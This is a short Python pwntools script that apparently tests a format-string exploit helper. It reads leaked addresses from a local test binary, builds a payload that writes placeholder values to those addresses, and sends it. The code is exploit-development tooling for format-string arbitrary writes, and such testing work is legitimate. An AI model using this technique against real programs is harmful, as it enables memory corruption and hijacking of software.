from one_fmt import *
from pwn import *

r = process("./test1", level="debug")

fmt = Fmt(24)
r.recvuntil("@ ")
fmt[int(r.recvuntil(" ", drop=True), 16)] = 0xdead
r.recvuntil("@ ")
fmt[int(r.recvuntil(" ", drop=True), 16)] = 0x1337
r.recvuntil("@ ")
fmt[int(r.recvuntil(" ", drop=True), 16)] = 0x4242
r.recvuntil("@ ")
fmt[int(r.recvuntil(" ", drop=True), 16)] = 0xbabe

r.recvuntil("say")

payload = fmt.build(0)
print payload
print len(payload)

r.sendline(payload)
r.interactive()
